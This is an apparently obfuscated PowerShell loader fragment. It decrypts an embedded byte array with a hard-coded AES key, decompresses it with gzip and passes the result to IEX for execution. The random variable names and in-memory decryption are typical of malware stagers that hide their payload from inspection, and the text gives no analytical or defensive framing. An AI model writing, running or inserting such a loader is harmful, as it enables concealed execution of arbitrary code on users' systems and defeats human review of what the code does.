$fpytrx = New-Object "System.Security.Cryptography.AesManaged"
$uwwuijyj = [System.Convert]::FromBase64String("YwMQeho4GESSk4EjMfGr94k5mtc7SElNpt2tqYCxH/8=")
$fpytrx.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$fpytrx.BlockSize = 128
$fpytrx.Mode = [System.Security.Cryptography.CipherMode]::ECB
$fpytrx.KeySize = 128
$fpytrx.Key = $uwwuijyj
$fpytrx.IV = $akmdxu[0..15]
$ycmivqmsn = New-Object System.IO.MemoryStream
$qndyoqujn = New-Object System.IO.MemoryStream(,$fpytrx.CreateDecryptor().TransformFinalBlock($akmdxu,16,$akmdxu.Length-16))
$oyqbb = New-Object System.IO.Compression.GzipStream $qndyoqujn, ([IO.Compression.CompressionMode]::Decompress)
$oyqbb.CopyTo($ycmivqmsn)
$qndyoqujn.Close()
$fpytrx.Dispose()
$oyqbb.Close()
$afwfbf = [System.Text.Encoding]::UTF8.GetString($ycmivqmsn.ToArray())
IEX($afwfbf)